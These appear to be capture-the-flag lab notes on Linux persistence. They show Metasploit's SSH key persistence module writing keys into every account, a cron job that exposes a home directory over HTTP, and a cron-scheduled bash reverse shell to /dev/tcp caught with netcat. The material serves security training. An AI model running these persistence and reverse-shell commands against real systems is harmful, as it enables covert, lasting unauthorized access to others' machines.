*To use the Metasploit persistence modules, we will first need to elevate our privileges on the Linux target.*

# Persistence via SSH Keys

```shell
use post/linux/manage/sshkey_persistence
set SESSION <session_number>
set CREATESSHFOLDER true
# We will now need to configure the module options, more specifically, we will need to set the SESSION ID and CREATESSHFOLDER options.
# The module will add a public SSH key to the authorized_keys file in the home directory of all user and service accounts.

# To use the private key, copy the key and save it as a new file, in this case, we will be saving it in the home directory of the root user on the Kali Linux system as ssh_key.
cp <loot_ssh_location> ssh_key

chmod 0400 ssh_key
# We will then need to assign the appropriate permissions to the file.

# We can now authenticate with the target using the private key via SSH
ssh -i ssh_key root@<target_domain>

# Retrieve the flag
ls -l
cat flag.txt
```

<br>

# Persistence Via Cron Jobs

Local Job Scheduling refers to the ability to create pre-scheduled and periodic background jobs using various mechanisms. Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence.

```shell
ssh student@<target_IP>
# Check the running processes
ps -eaf # Cron service is running

# Create a cron job which will use the SimpleHTTPServer python module to serve the files present in student user’s home directory
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
crontab cron
crontab -l

# Exit the session. Login and delete the wait file
ssh student@<target_IP>
rm wait

# Retrieve the flag
curl demo.ine.local:8000
curl demo.ine.local:8000/flag.txt

# Use nmap to scan for open ports. Since the HTTP server was started, port 8000 should be open.
nmap -p- demo.ine.local

# !! Alternative
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<my-ip>/1234 0>&1'" > cron
crontab cron
crontab -l 
ls

# Exit the session. Login and delete the wait file.
ssh student@<target_IP>
rm wait

# Retrieve the flag.
nc -nvlp 1234
ls -al
cat flag.txt 
# This work every minute
```
